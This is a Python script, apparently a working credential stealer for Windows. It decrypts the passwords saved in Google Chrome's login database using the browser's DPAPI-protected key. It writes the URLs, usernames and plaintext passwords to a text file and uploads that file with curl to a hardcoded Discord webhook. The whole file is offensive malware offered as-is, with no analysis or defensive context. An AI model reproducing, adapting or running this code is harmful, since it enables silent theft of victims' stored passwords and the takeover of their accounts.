import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta
import py2exe

def get_chrome_datetime(chromedate):
	return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key(local_state_path):
	with open(local_state_path, "r", encoding="utf-8") as f:
		local_state = f.read()
		local_state = json.loads(local_state)

	key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
	key = key[5:]
	return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
	try:
		iv = password[3:15]
		password = password[15:]
		cipher = AES.new(key, AES.MODE_GCM, iv)
		return cipher.decrypt(password)[:-16].decode()
	except:
		try:
			return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
		except:
			return ""

txt = ""

def addTxt(msg):
	global txt
	txt += msg + "\n"
	print(msg)

def main():
	homepath = os.path.expanduser(os.getenv('USERPROFILE'))
	db_path = homepath + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	local_state = homepath + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
	key = get_encryption_key(local_state)

	filename = "ChromeData.db"
	shutil.copyfile(db_path, filename)
	db = sqlite3.connect(filename)
	cursor = db.cursor()
	cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
	for row in cursor.fetchall():
		origin_url = row[0]
		action_url = row[1]
		username = row[2]
		password = decrypt_password(row[3], key)
		date_created = row[4]
		date_last_used = row[5]        
		if username or password:
			addTxt(f"Origin URL: {origin_url}")
			addTxt(f"Action URL: {action_url}")
			addTxt(f"Username: {username}")
			addTxt(f"Password: {password}")
		else:
			continue
		if date_created != 86400000000 and date_created:
			print(f"Creation date: {str(get_chrome_datetime(date_created))}")
		if date_last_used != 86400000000 and date_last_used:
			print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
		addTxt("="*50)

	cursor.close()
	db.close()
	try:
		os.remove(filename)
	except:
		pass

	with open(homepath + "\\info.txt", "w") as f:
		f.write(txt)

	os.system('cmd /c "curl -k -F "payload_json={\\\"content\\\": \\\"Oh yaz\\\"}\" -F \"file1=@%HOMEDRIVE%%HOMEPATH%\\info.txt\" https://discord.com/api/webhooks/1081988020032512121/le4vkWvq7GPw1GXdJ_bcwlog6778CyDB_3K5fLFU188NmyAIjvMLQtoeObbW8uHObHX8"')

if __name__ == '__main__':
	main()